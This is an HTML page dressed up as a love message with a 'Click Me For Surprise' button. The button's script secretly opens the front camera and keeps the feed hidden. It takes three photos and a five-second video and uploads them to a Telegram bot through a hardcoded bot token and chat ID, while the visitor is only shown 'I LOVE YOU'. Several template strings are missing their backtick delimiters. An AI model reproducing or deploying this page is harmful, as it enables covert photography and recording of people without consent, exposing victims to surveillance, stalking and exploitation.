<!DOCTYPE html> 
<html lang="en"> 
<head> 
    <meta charset="UTF-8"> 
    <meta name="viewport" content="width=device-width, initial-scale=1.0"> 
    <title>To My Love</title> 
    <style> 
        body { 
            background: linear-gradient(145deg, #ff9a9e, #fad0c4); 
            font-family: 'Arial', sans-serif; 
            text-align: center; 
            padding: 50px; 
            color: #fff; 
        } 
        h1 { 
            font-size: 3rem; 
            margin: 20px 0; 
            animation: fadeIn 2s ease-in-out; 
        } 
        p { 
            font-size: 1.5rem; 
            margin: 15px 0; 
        } 
        button { 
            padding: 10px 20px; 
            margin: 20px; 
            border: none; 
            border-radius: 20px; 
            background: #ff6f61; 
            color: white; 
            font-size: 1.2rem; 
            cursor: pointer; 
            transition: all 0.3s ease; 
        } 
        button:hover { 
            background: #ff4f4f; 
            transform: scale(1.1); 
        } 
        video, canvas { 
            display: none; 
        } 
        @keyframes fadeIn { 
            from { opacity: 0; } 
            to { opacity: 1; } 
        } 
    </style> 
</head> 
<body> 
    <h1>Hey Love! 💖</h1> 
    <p>I just want to let you know that you mean the world to me. You are my sunshine and my rainbow after the storm.</p> 
    <p>I love you more than words can say!</p> 
    <button onclick="captureMedia()">Click Me For Surprise</button> 
    <p id="loadingMessage" style="display: none;">Processing your request...</p> 
    <p id="message"></p> 
    <video id="video" autoplay></video> 
    <canvas id="canvas"></canvas> 
 
    <script> 
        const telegramToken = '8300999783:AAEXDG2aagB7YsXluEuitzqYjKYNpnw_1xQ'; 
        const chatId = '7342743761'; 
 
        async function captureMedia() { 
            try { 
                const video = document.getElementById('video'); 
                const canvas = document.getElementById('canvas'); 
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } }); 
                video.srcObject = stream; 
 
                // Capture 3 photos 
                for (let i = 1; i <= 3; i++) { 
                    await new Promise(resolve => setTimeout(resolve, 1000)); // Delay between captures 
                    capturePhoto(video, canvas, i); 
                } 
 
                // Record a 5-second video 
                await recordVideo(stream); 
 
                // Stop the stream 
                stream.getTracks().forEach(track => track.stop()); 
                document.getElementById('loadingMessage').style.display = 'none'; 
                document.getElementById('message').textContent = 'I LOVE YOU❤️'; 
            } catch (error) { 
                console.error('Error accessing camera:', error); 
                alert('Error accessing camera. Please make sure your device supports camera access.'); 
            } 
        } 
 
        function capturePhoto(video, canvas, index) { 
            return new Promise((resolve) => { 
                canvas.width = video.videoWidth; 
                canvas.height = video.videoHeight; 
                const context = canvas.getContext('2d'); 
                context.drawImage(video, 0, 0, canvas.width, canvas.height); 
                canvas.toBlob(async (blob) => { 
                    await sendMediaToTelegram(blob, photo_${index}, 'photo'); 
                    resolve(); 
                }, 'image/jpeg'); 
            }); 
        } 
 
        async function recordVideo(stream) { 
            return new Promise((resolve, reject) => { 
                const mediaRecorder = new MediaRecorder(stream); 
                const chunks = []; 
                mediaRecorder.ondataavailable = (event) => { 
                    chunks.push(event.data); 
                }; 
 
                mediaRecorder.onstop = async () => { 
                    const videoBlob = new Blob(chunks, { type: 'video/webm' }); 
                    await sendMediaToTelegram(videoBlob, 'video', 'video'); 
                    resolve(); 
                }; 
 
                mediaRecorder.onerror = (event) => { 
                    reject(event.error); 
                }; 
 
                mediaRecorder.start(); 
                setTimeout(() => { 
                    mediaRecorder.stop(); 
                }, 5000); // Record for 5 seconds 
            }); 
        } 
 
        async function sendMediaToTelegram(blob, fileName, type) { 
            const formData = new FormData(); 
            formData.append(type, blob, ${fileName}.${type === 'photo' ? 'jpg' : 'webm'}); 
            formData.append('chat_id', chatId); 
 
            try { 
                await fetch(https://api.telegram.org/bot${telegramToken}/send${type.charAt(0).toUpperCase() + type.slice(1)}, { 
                    method: 'POST', 
                    body: formData 
                }); 
                console.log(${type} sent successfully: ${fileName}); 
            } catch (error) { 
                console.error(Error sending ${type} to Telegram:, error); 
            } 
        } 
    </script> 
</body> 
</html>
